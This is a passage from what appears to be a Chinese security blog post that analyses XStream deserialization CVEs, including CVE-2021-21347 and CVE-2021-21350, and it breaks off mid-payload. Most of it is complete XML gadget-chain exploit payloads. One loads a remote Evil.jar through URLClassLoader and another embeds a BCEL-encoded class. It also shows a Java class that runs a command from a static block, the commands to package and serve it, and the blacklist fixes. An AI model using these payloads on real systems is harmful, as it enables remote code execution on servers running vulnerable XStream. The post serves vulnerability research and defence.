class="name">hashtable</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">javax.swing.UIDefaults</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">defaultLocale</span> <span class="attr">reference</span>=<span class="string">&#x27;../../../../../../../javax.swing.UIDefaults/default/defaultLocale&#x27;</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">resourceCache</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">javax.swing.UIDefaults</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">javax.swing.UIDefaults</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">tables</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">javax.swing.MultiUIDefaults</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">type</span>&gt;</span>ysomap<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">m__obj</span> <span class="attr">class</span>=<span class="string">&#x27;string&#x27;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">m__obj</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sorted-set</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>这个是wh1t3p1g师傅上交的，实际为ysomap里的LazyValue，师傅给的调用链分析</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">javax.naming.ldap.Rdn$RdnEntry.compareTo</span><br><span class="line">    com.sun.org.apache.xpath.internal.objects.XString.equal</span><br><span class="line">        javax.swing.MultiUIDefaults.toString</span><br><span class="line">            UIDefaults.get</span><br><span class="line">                UIDefaults.getFromHashTable</span><br><span class="line">                    UIDefaults$LazyValue.createValue</span><br><span class="line">                    SwingLazyValue.createValue</span><br><span class="line">                        javax.naming.InitialContext.doLookup()</span><br></pre></td></tr></table></figure><p>注意官网poc里面的是<arg>标签，估计是jdk版本原因</p><h3 id="黑名单：-3"><a href="#黑名单：-3" class="headerlink" title="黑名单："></a>黑名单：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sun.swing.SwingLazyValue</span><br></pre></td></tr></table></figure><h2 id="CVE-2021-21347"><a href="#CVE-2021-21347" class="headerlink" title="CVE-2021-21347"></a>CVE-2021-21347</h2><p>author: threedr3am</p><h3 id="POC-3"><a href="#POC-3" class="headerlink" title="POC"></a>POC</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java.util.PriorityQueue</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">size</span>&gt;</span>2<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">comparator</span> <span class="attr">class</span>=<span class="string">&#x27;javafx.collections.ObservableList$1&#x27;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span>&gt;</span>3<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">contentType</span>&gt;</span>text/plain<span class="tag">&lt;/<span class="name">contentType</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">is</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.SequenceInputStream&#x27;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">e</span> <span class="attr">class</span>=<span class="string">&#x27;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">iterator</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">names</span> <span class="attr">class</span>=<span class="string">&#x27;java.util.AbstractList$Itr&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">cursor</span>&gt;</span>0<span class="tag">&lt;/<span class="name">cursor</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">lastRet</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">lastRet</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">expectedModCount</span>&gt;</span>0<span class="tag">&lt;/<span class="name">expectedModCount</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">class</span>=<span class="string">&#x27;java.util.Arrays$ArrayList&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&#x27;string-array&#x27;</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">string</span>&gt;</span>Evil<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">outer-class</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">names</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">processorCL</span> <span class="attr">class</span>=<span class="string">&#x27;java.net.URLClassLoader&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">ucp</span> <span class="attr">class</span>=<span class="string">&#x27;sun.misc.URLClassPath&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">urls</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">vector</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">capacityIncrement</span>&gt;</span>0<span class="tag">&lt;/<span class="name">capacityIncrement</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">elementCount</span>&gt;</span>1<span class="tag">&lt;/<span class="name">elementCount</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">elementData</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://127.0.0.1:80/Evil.jar<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;/<span class="name">elementData</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">vector</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">urls</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">path</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://127.0.0.1:80/Evil.jar<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">path</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">loaders</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">lmap</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">ucp</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">package2certs</span> <span class="attr">class</span>=<span class="string">&#x27;concurrent-hash-map&#x27;</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">classes</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">defaultDomain</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">classloader</span> <span class="attr">class</span>=<span class="string">&#x27;java.net.URLClassLoader&#x27;</span> <span class="attr">reference</span>=<span class="string">&#x27;../..&#x27;</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">principals</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">hasAllPerm</span>&gt;</span>false<span class="tag">&lt;/<span class="name">hasAllPerm</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">staticPermissions</span>&gt;</span>false<span class="tag">&lt;/<span class="name">staticPermissions</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">key</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">reference</span>=<span class="string">&#x27;../..&#x27;</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">defaultDomain</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">initialized</span>&gt;</span>true<span class="tag">&lt;/<span class="name">initialized</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">pdcache</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">processorCL</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">iterator</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">type</span>&gt;</span>KEYS<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">e</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">in</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.ByteArrayInputStream&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">buf</span>&gt;</span><span class="tag">&lt;/<span class="name">buf</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">pos</span>&gt;</span>-2147483648<span class="tag">&lt;/<span class="name">pos</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">mark</span>&gt;</span>0<span class="tag">&lt;/<span class="name">mark</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">count</span>&gt;</span>0<span class="tag">&lt;/<span class="name">count</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">in</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">is</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">consumed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">consumed</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">transferFlavors</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dataLen</span>&gt;</span>0<span class="tag">&lt;/<span class="name">dataLen</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</span> <span class="attr">reference</span>=<span class="string">&#x27;../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>这个POC的RCE触发点是com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ClassLoader processorCL;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasNext</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.nextProc != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">this</span>.names.hasNext()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        String var1 = (String)<span class="keyword">this</span>.names.next();</span><br><span class="line"></span><br><span class="line">        Processor var2;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                var2 = (Processor)((Processor)<span class="keyword">this</span>.processorCL.loadClass(var1).newInstance());</span><br><span class="line">                ...</span><br></pre></td></tr></table></figure><p>构造一个有evil code的static代码块类，打包jar</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExploitStaticCalc</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;open -a calculator.app&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jar cvf Exploit.jar ExploitStaticCalc.class</span><br><span class="line">python -m SimpleHTTPServer 8000</span><br></pre></td></tr></table></figure><p>参考【2】原文中有提到几点有意思的，这里就不复述了</p><ol><li>XStream 的outer-class</li><li>匿名内部类</li><li>不同java版本下ObservableList、ProtectionDomain的不同导致POC要做相应的修改</li></ol><p>但是在测试的时候，8u60、8u172都失败，8u231成功。失败的报错事com.sun.tools.javac.processing.AnnotationProcessingError，判断应该是processorCL 结构问题，对比8u231跟踪到java.lang.ClassLoader#defineClass1，参数基本一样，但是loadClass失败，未排查到原因。</p><p>太菜鸡了。。。</p><h3 id="黑名单：-4"><a href="#黑名单：-4" class="headerlink" title="黑名单："></a>黑名单：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">om.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator</span><br><span class="line">denyTypeHierarchyDynamically(<span class="string">&quot;javax.activation.DataSource&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="CVE-2021-21350"><a href="#CVE-2021-21350" class="headerlink" title="CVE-2021-21350"></a>CVE-2021-21350</h2><p>author: thread3am</p><h3 id="POC-4"><a href="#POC-4" class="headerlink" title="POC"></a>POC</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java.util.PriorityQueue</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">size</span>&gt;</span>2<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">comparator</span> <span class="attr">class</span>=<span class="string">&#x27;javafx.collections.ObservableList$1&#x27;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span>&gt;</span>3<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">contentType</span>&gt;</span>text/plain<span class="tag">&lt;/<span class="name">contentType</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">is</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.SequenceInputStream&#x27;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">e</span> <span class="attr">class</span>=<span class="string">&#x27;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">iterator</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">names</span> <span class="attr">class</span>=<span class="string">&#x27;java.util.AbstractList$Itr&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">cursor</span>&gt;</span>0<span class="tag">&lt;/<span class="name">cursor</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">lastRet</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">lastRet</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">expectedModCount</span>&gt;</span>0<span class="tag">&lt;/<span class="name">expectedModCount</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">class</span>=<span class="string">&#x27;java.util.Arrays$ArrayList&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&#x27;string-array&#x27;</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">string</span>&gt;</span>$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeQ$ddN$c20$Y$3d$85$c9$60$O$e5G$fcW$f0J0Qn$bc$c3$Y$T$83$89$c9$oF$M$5e$97$d9$60$c9X$c9$d6$R$5e$cb$h5$5e$f8$A$3e$94$f1$x$g$q$b1MwrN$cf$f9$be$b6$fb$fcz$ff$Ap$8a$aa$83$MJ$O$caX$cb$a2bp$dd$c6$86$8dM$86$cc$99$M$a5$3egH$d7$h$3d$G$ebR$3d$K$86UO$86$e2$s$Z$f5Et$cf$fb$B$v$rO$f9$3c$e8$f1H$g$fe$xZ$faI$c6T$c3kOd$d0bp$daS_$8c$b5Talc$8bxW$r$91$_$ae$a41$e7$8c$e9d$c8$t$dc$85$8d$ac$8dm$X$3b$d8$a5$d2j$y$c2$da1$afQ$D$3f$J$b8V$91$8b$3d$ecS$7d$Ta$u$98P3$e0$e1$a0$d9$e9$P$85$af$Z$ca3I$aa$e6ug$de$93$a1$f8g$bcKB$zG$d4$d6$Z$I$3d$t$95z$c3$fb$e7$a1$83$5bb$w$7c$86$c3$fa$c2nWG2$i$b4$W$D$b7$91$f2E$i$b7p$80$rzQ3$YM$ba$NR$c8$R$bb$md$84$xG$af$60oH$95$d2$_$b0$k$9eII$c11$3a$d2$f4$cd$c2$ow$9e$94eb$eeO$820$3fC$d0$$$fd$BZ$85Y$ae$f8$N$93$85$cf$5c$c7$B$A$A<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">outer-class</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">names</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">processorCL</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.bcel.internal.util.ClassLoader&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">parent</span> <span class="attr">class</span>=<span class="string">&#x27;sun.misc.Launcher$ExtClassLoader&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">package2certs</span> <span class="attr">class</span>=<span class="string">&#x27;hashtable&#x27;</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">classes</span> <span class="attr">defined-in</span>=<span class="string">&#x27;java.lang.ClassLoader&#x27;</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">defaultDomain</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">classloader</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.bcel.internal.util.ClassLoader&#x27;</span> <span class="attr">reference</span>=<span class="string">&#x27;../..&#x27;</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">principals</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">hasAllPerm</span>&gt;</span>false<span class="tag">&lt;/<span class="name">hasAllPerm</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">staticPermissions</span>&gt;</span>false<span class="tag">&lt;/<span class="name">staticPermissions</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">key</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">reference</span>=<span class="string">&#x27;../..&#x27;</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">defaultDomain</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">packages</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">nativeLibraries</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">assertionLock</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.bcel.internal.util.ClassLoader&#x27;</span> <span class="attr">reference</span>=<span class="string">&#x27;..&#x27;</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">defaultAssertionStatus</span>&gt;</span>false<span class="tag">&lt;/<span class="name">defaultAssertionStatus</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">classes</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">ignored__packages</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>java.<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>sun.<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">ignored__packages</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">repository</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.bcel.internal.util.SyntheticRepository&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">__path</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">paths</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">class__path</span>&gt;</span>.<span class="tag">&lt;/<span class="name">class__path</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">__path</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">__loadedClasses</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">repository</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">deferTo</span> <span class="attr">class</span>=<span class="string">&#x27;sun.misc.Launcher$ExtClassLoader&#x27;</span> <span 